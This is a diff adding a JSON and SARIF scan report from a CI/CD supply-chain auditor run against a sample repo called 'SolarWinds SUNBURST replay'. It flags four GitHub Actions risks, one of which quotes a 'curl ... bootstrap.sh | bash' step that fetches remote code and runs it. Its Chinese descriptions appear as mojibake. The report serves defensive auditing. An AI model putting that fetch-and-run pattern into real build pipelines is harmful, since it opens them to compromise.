@@ -1,0 +1,416 @@
+{
+    "scan_id":  "cicd-20260612030937",
+    "generated_at":  "2026-06-12T03:09:37.642097+00:00",
+    "target_path":  "C:\\Users\\86189\\Desktop\\sysml2\\cases\\solarwinds-sunburst\\sample-repo",
+    "target":  {
+                   "importId":  "imp_79f51dc69134",
+                   "projectName":  "SolarWinds SUNBURST replay",
+                   "sourceType":  "local",
+                   "path":  "C:\\Users\\86189\\Desktop\\sysml2\\cases\\solarwinds-sunburst\\sample-repo"
+               },
+    "workflows":  [
+                      ".github/workflows/release.yml"
+                  ],
+    "summary":  {
+                    "workflow_count":  1,
+                    "job_count":  1,
+                    "total_steps":  5,
+                    "finding_count":  4,
+                    "risk_score":  88,
+                    "risk_level":  "high",
+                    "critical":  0,
+                    "high":  3,
+                    "medium":  0,
+                    "low":  1,
+                    "by_rule":  {
+                                    "github-actions.permissions-write-all":  1,
+                                    "github-actions.mutable-action-ref":  1,
+                                    "github-actions.remote-script-pipe":  1,
+                                    "github-actions.unpinned-action-ref":  1
+                                },
+                    "tools":  [
+                                  {
+                                      "name":  "zizmor",
+                                      "available":  false,
+                                      "version":  null,
+                                      "error":  "Skipped",
+                                      "state":  "skipped"
+                                  },
+                                  {
+                                      "name":  "actionlint",
+                                      "available":  false,
+                                      "version":  null,
+                                      "error":  "Skipped",
+                                      "state":  "skipped"
+                                  }
+                              ],
+                    "duration_seconds":  0.03,
+                    "target":  {
+                                   "importId":  "imp_79f51dc69134",
+                                   "projectName":  "SolarWinds SUNBURST replay",
+                                   "sourceType":  "local",
+                                   "path":  "C:\\Users\\86189\\Desktop\\sysml2\\cases\\solarwinds-sunburst\\sample-repo"
+                               },
+                    "target_key":  "import:imp_79f51dc69134",
+                    "ignored":  0,
+                    "ignored_total":  0,
+                    "baseline_exists":  false,
+                    "baseline_total":  0,
+                    "baseline_created_at":  null,
+                    "new":  4,
+                    "fixed":  0,
+                    "trend":  [
+                                  {
+                                      "scan_id":  "cicd-20260612030937",
+                                      "generated_at":  "2026-06-12T03:09:37.642097+00:00",
+                                      "target_key":  "import:imp_79f51dc69134",
+                                      "projectName":  "SolarWinds SUNBURST replay",
+                                      "total":  4,
+                                      "critical":  0,
+                                      "high":  3,
+                                      "medium":  0,
+                                      "low":  1,
+                                      "new":  4,
+                                      "fixed":  0,
+                                      "ignored":  0,
+                                      "tools":  [
+
+                                                ]
+                                  }
+                              ]
+                },
+    "findings":  [
+                     {
+                         "id":  "CI-381B39CC",
+                         "rule_id":  "github-actions.permissions-write-all",
+                         "title":  "GitHub Token æéè¿å®½",
+                         "severity":  "high",
+                         "score":  88,
+                         "workflow":  ".github/workflows/release.yml",
+                         "job_id":  null,
+                         "job_name":  null,
+                         "step_index":  null,
+                         "step_name":  null,
+                         "line":  7,
+                         "evidence":  "permissions: write-all",
+                         "reason":  "permissions: write-all ä¼ç» GITHUB_TOKEN æäºå\u0085¨é¨åæéï¼æ©å¤§å­æ®æ³é²æå·¥ä½æµå«æåçå½±åé¢ã",
+                         "recommendation":  "æ workflow/job æå°åå£°ææéï¼ä¾å¦ contents: readï¼åå¸ä»»å¡åªæäºå¿\u0085è¦åæéã",
+                         "fingerprint":  "85c6d96b5491452a517210307b9f751005af3566ca6e960de0ac417a94fadeb2",
+                         "scanner":  "SupplyGuard CI/CD",
+                         "confidence":  "medium"
+                     },
+                     {
+                         "id":  "CI-F191842F",
+                         "rule_id":  "github-actions.mutable-action-ref",
+                         "title":  "Action ä½¿ç¨å¯åå¼ç¨",
+                         "severity":  "high",
+                         "score":  86,
+                         "workflow":  ".github/workflows/release.yml",
+                         "job_id":  "build-update",
+                         "job_name":  "build-update",
+                         "step_index":  2,
+                         "step_name":  "step 2",
+                         "line":  14,
+                         "evidence":  "uses: third-party/setup-release@main",
+                         "reason":  "Action å¼ç¨ main/master/latest ç­å¯ååæ¯ï¼ç¬¬ä¸æ¹ä»åºæ´æ°æè¢«æ¥ç®¡åä¼å½±åæå»ºç»æã",
+                         "recommendation":  "å°ç¬¬ä¸æ¹ Action åºå®å°å¯ä¿¡å®æ´ commit SHAï¼å¹¶ç¨ Dependabot/Renovate å®ææ´æ°ã",
+                         "fingerprint":  "c235f7d8267a11fc466a64e413395081edd8d5b740879ae6489889ca65caa937",
+                         "scanner":  "SupplyGuard CI/CD",
+                         "confidence":  "medium"
+                     },
+                     {
+                         "id":  "CI-2C2BEA95",
+                         "rule_id":  "github-actions.remote-script-pipe",
+                         "title":  "è¿ç¨èæ¬ç´æ¥ç®¡éæ§è¡",
+                         "severity":  "high",
+                         "score":  86,
+                         "workflow":  ".github/workflows/release.yml",
+                         "job_id":  "build-update",
+                         "job_name":  "build-update",
+                         "step_index":  4,
+                         "step_name":  "Simulated remote bootstrap",
+                         "line":  20,
+                         "evidence":  "curl https://updates.example.invalid/orion/bootstrap.sh | bash",
+                         "reason":  "curl/wget ä¸è½½å\u0085å®¹ç´æ¥äº¤ç» shell æ§è¡ï¼è¿ç¨ç«¯æç½ç»é¾è·¯å¼å¸¸ä¼ç´æ¥æ±¡ææå»ºç¯å¢ã",
+                         "recommendation":  "ä¸è½½åæ ¡éª checksum/signatureï¼ææ¿æ¢ä¸ºå¯ä¿¡ Action/å\u0085ç®¡çå¨ï¼å¹¶åºå®æ¥æºçæ¬ã",
+                         "fingerprint":  "0c2e34206a85f4e527591fac281017d93c61566b1a59bd36eaafc35f13c8ffb6",
+                         "scanner":  "SupplyGuard CI/CD",
+                         "confidence":  "medium"
+                     },
+                     {
+                         "id":  "CI-B525B104",
+                         "rule_id":  "github-actions.unpinned-action-ref",
+                         "title":  "Action æªåºå®å°å®æ´ commit SHA",
+                         "severity":  "low",
+                         "score":  45,
+                         "workflow":  ".github/workflows/release.yml",
+                         "job_id":  "build-update",
+                         "job_name":  "build-update",
+                         "step_index":  1,
+                         "step_name":  "step 1",
+                         "line":  13,
+                         "evidence":  "uses: actions/checkout@v4",
+                         "reason":  "Action ä½¿ç¨ tag æç­å¼ç¨ï¼çæ¬å¯è¢«ç§»å¨æè¦çï¼æ æ³ä¿è¯æå»ºè¾å\u0085¥ä¸å¯åã",
+                         "recommendation":  "å¨é«å®å\u0085¨æµç¨ä¸­ä½¿ç¨ 40 ä½å®æ´ commit SHAï¼æ®éæµç¨è³å°åºå®å¯ä¿¡ tag å¹¶å¯ç¨åæ´å®¡æ¥ã",
+                         "fingerprint":  "589917f832be7bc80dc3263acb6d49e681c12d23874be447ff048a96e165b5c4",
+                         "scanner":  "SupplyGuard CI/CD",
+                         "confidence":  "medium"
+                     }
+                 ],
+    "scanners":  [
+                     {
+                         "name":  "zizmor",
+                         "available":  false,
+                         "command":  "zizmor",
+                         "version":  null,
+                         "error":  "Skipped",
+                         "state":  "skipped"
+                     },
+                     {
+                         "name":  "actionlint",
+                         "available":  false,
+                         "command":  "actionlint",
+                         "version":  null,
+                         "error":  "Skipped",
+                         "state":  "skipped"
+                     }
+                 ],
+    "sarif":  {
+                  "$schema":  "https://json.schemastore.org/sarif-2.1.0.json",
+                  "version":  "2.1.0",
+                  "runs":  [
+                               {
+                                   "tool":  {
+                                                "driver":  {
+                                                               "name":  "SupplyGuard CI/CD Audit",
+                                                               "informationUri":  "https://zizmor.sh/",
+                                                               "rules":  [
+                                                                             {
+                                                                                 "id":  "github-actions.permissions-write-all",
+                                                                                 "name":  "GitHub Token æéè¿å®½",
+                                                                                 "shortDescription":  {
+                                                                                                          "text":  "GitHub Token æéè¿å®½"
+                                                                                                      },
+                                                                                 "fullDescription":  {
+                                                                                                         "text":  "permissions: write-all ä¼ç» GITHUB_TOKEN æäºå\u0085¨é¨åæéï¼æ©å¤§å­æ®æ³é²æå·¥ä½æµå«æåçå½±åé¢ã"
+                                                                                                     },
+                                                                                 "help":  {
+                                                                                              "text":  "æ workflow/job æå°åå£°ææéï¼ä¾å¦ contents: readï¼åå¸ä»»å¡åªæäºå¿\u0085è¦åæéã"
+                                                                                          },
+                                                                                 "properties":  {
+                                                                                                    "scanner":  "SupplyGuard CI/CD",
+                                                                                                    "severity":  "high"
+                                                                                                }
+                                                                             },
+                                                                             {
+                                                                                 "id":  "github-actions.mutable-action-ref",
+                                                                                 "name":  "Action ä½¿ç¨å¯åå¼ç¨",
+                                                                                 "shortDescription":  {
+                                                                                                          "text":  "Action ä½¿ç¨å¯åå¼ç¨"
+                                                                                                      },
+                                                                                 "fullDescription":  {
+                                                                                                         "text":  "Action å¼ç¨ main/master/latest ç­å¯ååæ¯ï¼ç¬¬ä¸æ¹ä»åºæ´æ°æè¢«æ¥ç®¡åä¼å½±åæå»ºç»æã"
+                                                                                                     },
+                                                                                 "help":  {
+                                                                                              "text":  "å°ç¬¬ä¸æ¹ Action åºå®å°å¯ä¿¡å®æ´ commit SHAï¼å¹¶ç¨ Dependabot/Renovate å®ææ´æ°ã"
+                                                                                          },
+                                                                                 "properties":  {
+                                                                                                    "scanner":  "SupplyGuard CI/CD",
+                                                                                                    "severity":  "high"
+                                                                                                }
+                                                                             },
+                                                                             {
+                                                                                 "id":  "github-actions.remote-script-pipe",
+                                                                                 "name":  "è¿ç¨èæ¬ç´æ¥ç®¡éæ§è¡",
+                                                                                 "shortDescription":  {
+                                                                                                          "text":  "è¿ç¨èæ¬ç´æ¥ç®¡éæ§è¡"
+                                                                                                      },
+                                                                                 "fullDescription":  {
+                                                                                                         "text":  "curl/wget ä¸è½½å\u0085å®¹ç´æ¥äº¤ç» shell æ§è¡ï¼è¿ç¨ç«¯æç½ç»é¾è·¯å¼å¸¸ä¼ç´æ¥æ±¡ææå»ºç¯å¢ã"
+                                                                                                     },
+                                                                                 "help":  {
+                                                                                              "text":  "ä¸è½½åæ ¡éª checksum/signatureï¼ææ¿æ¢ä¸ºå¯ä¿¡ Action/å\u0085ç®¡çå¨ï¼å¹¶åºå®æ¥æºçæ¬ã"
+                                                                                          },
+                                                                                 "properties":  {
+                                                                                                    "scanner":  "SupplyGuard CI/CD",
+                                                                                                    "severity":  "high"
+                                                                                                }
+                                                                             },
+                                                                             {
+                                                                                 "id":  "github-actions.unpinned-action-ref",
+                                                                                 "name":  "Action æªåºå®å°å®æ´ commit SHA",
+                                                                                 "shortDescription":  {
+                                                                                                          "text":  "Action æªåºå®å°å®æ´ commit SHA"
+                                                                                                      },
+                                                                                 "fullDescription":  {
+                                                                                                         "text":  "Action ä½¿ç¨ tag æç­å¼ç¨ï¼çæ¬å¯è¢«ç§»å¨æè¦çï¼æ æ³ä¿è¯æå»ºè¾å\u0085¥ä¸å¯åã"
+                                                                                                     },
+                                                                                 "help":  {
+                                                                                              "text":  "å¨é«å®å\u0085¨æµç¨ä¸­ä½¿ç¨ 40 ä½å®æ´ commit SHAï¼æ®éæµç¨è³å°åºå®å¯ä¿¡ tag å¹¶å¯ç¨åæ´å®¡æ¥ã"
+                                                                                          },
+                                                                                 "properties":  {
+                                                                                                    "scanner":  "SupplyGuard CI/CD",
+                                                                                                    "severity":  "low"
+                                                                                                }
+                                                                             }
+                                                                         ]
+                                                           }
+                                            },
+                                   "automationDetails":  {
+                                                             "id":  "imp_79f51dc69134"
+                                                         },
+                                   "results":  [
+                                                   {
+                                                       "ruleId":  "github-actions.permissions-write-all",
+                                                       "level":  "error",
+                                                       "message":  {
+                                                                       "text":  "GitHub Token æéè¿å®½: permissions: write-all"
+                                                                   },
+                                                       "locations":  [
+                                                                         {
+                                                                             "physicalLocation":  {
+                                                                                                      "artifactLocation":  {
+                                                                                                                               "uri":  ".github/workflows/release.yml"
+                                                                                                                           },
+                                                                                                      "region":  {
+                                                                                                                     "startLine":  7
+                                                                                                                 }
+                                                                                                  }
+                                                                         }
+                                                                     ],
+                                                       "partialFingerprints":  {
+                                                                                   "primaryLocationLineHash":  "85c6d96b5491452a517210307b9f751005af3566ca6e960de0ac417a94fadeb2"
+                                                                               },
+                                                       "properties":  {
+                                                                          "scanner":  "SupplyGuard CI/CD",
+                                                                          "confidence":  "medium",
+                                                                          "recommendation":  "æ workflow/job æå°åå£°ææéï¼ä¾å¦ contents: readï¼åå¸ä»»å¡åªæäºå¿\u0085è¦åæéã",
+                                                                          "job_id":  null,
+                                                                          "step_name":  null
+                                                                      }
+                                                   },
+                                                   {
+                                                       "ruleId":  "github-actions.mutable-action-ref",
+                                                       "level":  "error",
+                                                       "message":  {
+                                                                       "text":  "Action ä½¿ç¨å¯åå¼ç¨: uses: third-party/setup-release@main"
+                                                                   },
+                                                       "locations":  [
+                                                                         {
+                                                                             "physicalLocation":  {
+                                                                                                      "artifactLocation":  {
+                                                                                                                               "uri":  ".github/workflows/release.yml"
+                                                                                                                           },
+                                                                                                      "region":  {
+                                                                                                                     "startLine":  14
+                                                                                                                 }
+                                                                                                  }
+                                                                         }
+                                                                     ],
+                                                       "partialFingerprints":  {
+                                                                                   "primaryLocationLineHash":  "c235f7d8267a11fc466a64e413395081edd8d5b740879ae6489889ca65caa937"
+                                                                               },
+                                                       "properties":  {
+                                                                          "scanner":  "SupplyGuard CI/CD",
+                                                                          "confidence":  "medium",
+                                                                          "recommendation":  "å°ç¬¬ä¸æ¹ Action åºå®å°å¯ä¿¡å®æ´ commit SHAï¼å¹¶ç¨ Dependabot/Renovate å®ææ´æ°ã",
+                                                                          "job_id":  "build-update",
+                                                                          "step_name":  "step 2"
+                                                                      }
+                                                   },
+                                                   {
+                                                       "ruleId":  "github-actions.remote-script-pipe",
+                                                       "level":  "error",
+                                                       "message":  {
+                                                                       "text":  "è¿ç¨èæ¬ç´æ¥ç®¡éæ§è¡: curl https://updates.example.invalid/orion/bootstrap.sh | bash"
+                                                                   },
+                                                       "locations":  [
+                                                                         {
+                                                                             "physicalLocation":  {
+                                                                                                      "artifactLocation":  {
+                                                                                                                               "uri":  ".github/workflows/release.yml"
+                                                                                                                           },
+                                                                                                      "region":  {
+                                                                                                                     "startLine":  20
+                                                                                                                 }
+                                                                                                  }
+                                                                         }
+                                                                     ],
+                                                       "partialFingerprints":  {
+                                                                                   "primaryLocationLineHash":  "0c2e34206a85f4e527591fac281017d93c61566b1a59bd36eaafc35f13c8ffb6"
+                                                                               },
+                                                       "properties":  {
+                                                                          "scanner":  "SupplyGuard CI/CD",
+                                                                          "confidence":  "medium",
+                                                                          "recommendation":  "ä¸è½½åæ ¡éª checksum/signatureï¼ææ¿æ¢ä¸ºå¯ä¿¡ Action/å\u0085ç®¡çå¨ï¼å¹¶åºå®æ¥æºçæ¬ã",
+                                                                          "job_id":  "build-update",
+                                                                          "step_name":  "Simulated remote bootstrap"
+                                                                      }
+                                                   },
+                                                   {
+                                                       "ruleId":  "github-actions.unpinned-action-ref",
+                                                       "level":  "note",
+                                                       "message":  {
+                                                                       "text":  "Action æªåºå®å°å®æ´ commit SHA: uses: actions/checkout@v4"
+                                                                   },
+                                                       "locations":  [
+                                                                         {
+                                                                             "physicalLocation":  {
+                                                                                                      "artifactLocation":  {
+                                                                                                                               "uri":  ".github/workflows/release.yml"
+                                                                                                                           },
+                                                                                                      "region":  {
+                                                                                                                     "startLine":  13
+                                                                                                                 }
+                                                                                                  }
+                                                                         }
+                                                                     ],
+                                                       "partialFingerprints":  {
+                                                                                   "primaryLocationLineHash":  "589917f832be7bc80dc3263acb6d49e681c12d23874be447ff048a96e165b5c4"
+                                                                               },
+                                                       "properties":  {
+                                                                          "scanner":  "SupplyGuard CI/CD",
+                                                                          "confidence":  "medium",
+                                                                          "recommendation":  "å¨é«å®å\u0085¨æµç¨ä¸­ä½¿ç¨ 40 ä½å®æ´ commit SHAï¼æ®éæµç¨è³å°åºå®å¯ä¿¡ tag å¹¶å¯ç¨åæ´å®¡æ¥ã",
+                                                                          "job_id":  "build-update",
+                                                                          "step_name":  "step 1"
+                                                                      }
+                                                   }
+                                               ]
+                               }
+                           ]
+              },
+    "state":  {
+                  "target_key":  "import:imp_79f51dc69134",
+                  "ignored":  [
+
+                              ],
+                  "baseline":  null,
+                  "baselines":  {
+
+                                },
+                  "trend":  [
+                                {
+                                    "scan_id":  "cicd-20260612030937",
+                                    "generated_at":  "2026-06-12T03:09:37.642097+00:00",
+                                    "target_key":  "import:imp_79f51dc69134",
+                                    "projectName":  "SolarWinds SUNBURST replay",
+                                    "total":  4,
+                                    "critical":  0,
+                                    "high":  3,
+                                    "medium":  0,
+                                    "low":  1,
+                                    "new":  4,
+                                    "fixed":  0,
+                                    "ignored":  0,
+                                    "tools":  [
+
+                                              ]
+                                }
+                            ]
+              },
+    "report":  "# CI/CD æå»ºæµç¨é£é©æ¥å\n\nçææ¶é´ï¼2026-06-12 03:09:37 UTC\næ«æç®æ ï¼C:\\Users\\86189\\Desktop\\sysml2\\cases\\solarwinds-sunburst\\sample-repo\n\n## æè¦\n\n- Workflow æ°éï¼1\n- Job æ°éï¼1\n- Step æ°éï¼5\n- é£é©æ°éï¼4\n- ä¸¥éï¼0\n- é«å±ï¼3\n- ä¸­å±ï¼0\n- ä½å±ï¼1\n\n## æ«æå°ç Workflow\n\n- .github/workflows/release.yml\n\n## æ«æå¨\n\n| å·¥å\u0085· | ç¶æ | çæ¬ | è¿è¡ç¶æ | è¯´æ |\n| --- | --- | --- | --- | --- |\n| zizmor | ä¸å¯ç¨ | - | skipped | Skipped |\n| actionlint | ä¸å¯ç¨ | - | skipped | Skipped |\n\n## é£é©æç»\n\n| æ«æå¨ | Workflow | Job | Step | ç­çº§ | é£é©åå  | è¯æ® | ä¿®å¤å»ºè®® |\n| --- | --- | --- | --- | --- | --- | --- | --- |\n| SupplyGuard CI/CD | .github/workflows/release.yml | - | - | high | permissions: write-all ä¼ç» GITHUB_TOKEN æäºå\u0085¨é¨åæéï¼æ©å¤§å­æ®æ³é²æå·¥ä½æµå«æåçå½±åé¢ã | permissions: write-all (line 7) | æ workflow/job æå°åå£°ææéï¼ä¾å¦ contents: readï¼åå¸ä»»å¡åªæäºå¿\u0085è¦åæéã |\n| SupplyGuard CI/CD | .github/workflows/release.yml | build-update | step 2 | high | Action å¼ç¨ main/master/latest ç­å¯ååæ¯ï¼ç¬¬ä¸æ¹ä»åºæ´æ°æè¢«æ¥ç®¡åä¼å½±åæå»ºç»æã | uses: third-party/setup-release@main (line 14) | å°ç¬¬ä¸æ¹ Action åºå®å°å¯ä¿¡å®æ´ commit SHAï¼å¹¶ç¨ Dependabot/Renovate å®ææ´æ°ã |\n| SupplyGuard CI/CD | .github/workflows/release.yml | build-update | Simulated remote bootstrap | high | curl/wget ä¸è½½å\u0085å®¹ç´æ¥äº¤ç» shell æ§è¡ï¼è¿ç¨ç«¯æç½ç»é¾è·¯å¼å¸¸ä¼ç´æ¥æ±¡ææå»ºç¯å¢ã | curl https://updates.example.invalid/orion/bootstrap.sh \\| bash (line 20) | ä¸è½½åæ ¡éª checksum/signatureï¼ææ¿æ¢ä¸ºå¯ä¿¡ Action/å\u0085ç®¡çå¨ï¼å¹¶åºå®æ¥æºçæ¬ã |\n| SupplyGuard CI/CD | .github/workflows/release.yml | build-update | step 1 | low | Action ä½¿ç¨ tag æç­å¼ç¨ï¼çæ¬å¯è¢«ç§»å¨æè¦çï¼æ æ³ä¿è¯æå»ºè¾å\u0085¥ä¸å¯åã | uses: actions/checkout@v4 (line 13) | å¨é«å®å\u0085¨æµç¨ä¸­ä½¿ç¨ 40 ä½å®æ´ commit SHAï¼æ®éæµç¨è³å°åºå®å¯ä¿¡ tag å¹¶å¯ç¨åæ´å®¡æ¥ã |\n\n## æ«ææç¤º\n\n- æ«æå®æã\n",
+    "warnings":  [
+
+                 ]
+}
